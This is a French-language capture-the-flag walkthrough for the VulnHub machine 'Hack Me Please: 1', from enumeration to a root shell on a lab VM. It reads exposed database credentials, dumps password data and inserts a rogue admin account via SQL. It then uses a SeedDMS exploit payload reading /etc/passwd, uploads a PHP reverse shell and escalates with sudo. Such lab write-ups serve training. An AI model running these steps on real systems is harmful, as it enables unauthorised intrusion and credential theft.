---
title: "CTF Hack Me Please: 1"
date: 2021-09-20
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/hack-me-please-1,731
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.2** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.23`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir HackMePlease1 && cd HackMePlease1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
33060/tcp open  mysqlx?
```

On a un serveur **Apache** 2.4.41 sur le port **80** et un serveur **MySQL** 8.0.25 sur le port **3306**.

En inspectant dans les fichiers JavaScript, on trouve un indice dans le fichier "main.js".

```txt
//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
```

Ce endpoint est un formulaire de connexion. Sur Internet, on découvre que **SeedDMS** est une sorte de **CMS**. En poursuivant avec **Gobuster**, on découvre des choses intéressantes.

```bash
$ gobuster dir -u http://$IP/seeddms51x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster.txt
/data                 (Status: 301) [Size: 322] [--> http://192.168.1.23/seeddms51x/data/]
/www                  (Status: 301) [Size: 321] [--> http://192.168.1.23/seeddms51x/www/] 
/conf                 (Status: 301) [Size: 322] [--> http://192.168.1.23/seeddms51x/conf/]
/pear                 (Status: 301) [Size: 322] [--> http://192.168.1.23/seeddms51x/pear/]
```

On obtient un résultat en approfondisant sur le dossier "/conf".

```bash
$ gobuster dir -u http://$IP/seeddms51x/conf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster_conf.txt
/settings.xml         (Status: 200) [Size: 12377]
```

Dans ce fichier xml, on trouve une ligne intéressante.

```xml
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="seeddms" doNotCheckVersion="false"> </database>
```

En effet, on a ce qu'il faut pour se connecter au serveur **MySQL**.

```bash
$ mysql -h $IP -u seeddms -p
Enter password: seeddms
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 83
Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)
```

Une fois connecté, on consulte les bases de données disponibles.

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| seeddms            |
| sys                |
+--------------------+
```

On en retrouve une nommée "seeddms".

```bash
mysql> use seeddms;
mysql> show tables;
+------------------------------+
| [...]                        |
| tblUsers                     |
| [...]                        |
| users                        |
+------------------------------+
43 rows in set (0,01 sec)
```

On énumère les tables dont deux sembles concernées des utilisateurs.

```bash
mysql> select * from tblUsers \G;
*************************** 1. row ***************************
           id: 1
        login: admin
          pwd: f9ef2c539bad8a6d2f3432b6d49ab51a
     fullName: Administrator
        email: address@server.com
     language: en_GB
        theme:
      comment:
         role: 1
       hidden: 0
pwdExpiration: 2021-07-13 00:12:25
loginfailures: 0
     disabled: 0
        quota: 0
   homefolder: NULL
```

On a un exemple d'utilisateur bien qu'il ne soit pas utilisable (mot de passe encodé en md5).

```bash
mysql> select * from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
```

Dans cette seconde table, on récupère des crédentials intéressants "saket:Saket@#$1337", sans doute pour plus tard. En attendant, on génére un nouvel utilisateur pour se connecter au *CMS*.

```sql
INSERT INTO tblUsers VALUES (3, 'hackme', md5('pass'),'hackme', 'hackme@vulnhub.com', 'fr_FR', '', '', 1, 0, '2042-07-13 00:12:25', 0, 0, 0, NULL);
```

On peut désormais se connecter avec "hackme:pass".

Sur **Searchsploit**, on trouve un exploit possible.

```bash
$ searchsploit -x php/webapps/47022.txt
example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd
```

Pour ce faire, on a besoin d'un webshell que l'on prépare.

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php .
$ vim php-reverse-shell.php
/ip
```

Et dans un nouvel onglet, on lance le serveur **Ncat** `nc -lnvp 1234`.

Pour uploader le webshell, allez dans "Ajouter un document", puis dans le champs "Fichier local", cliquez sur "Parcourir" et validez en cliquant sur le bouton en bas "Ajouter un document". D'après l'énoncé de l'exploit, l'URL pour exécuter le webshell est [http://192.168.1.23/seeddms51x/data/1048576/4/1.php](http://192.168.1.23/seeddms51x/data/1048576/4/1.php) (remplacez par l'IP de votre VM).

## Pénétration

De retour dans le terminal, la connexion est établie et on peut se connecter avec l'utilisateur "saket".

```bash
$ su saket
Password: Saket@#$1337
python2 -c 'import pty; pty.spawn("/bin/bash")'
$ id
uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
```

## Escalation

On consulte les privilèges de cet utilisateur.

```bash
$ sudo -l
[sudo] password for saket: Saket@#$1337
User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

L'utilisateur peut tout faire.

```bash
$ sudo su
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Et voila c'est fini, pas de clef à trouver dans ce CTF d'après l'auteur "Aim: To get root shell".
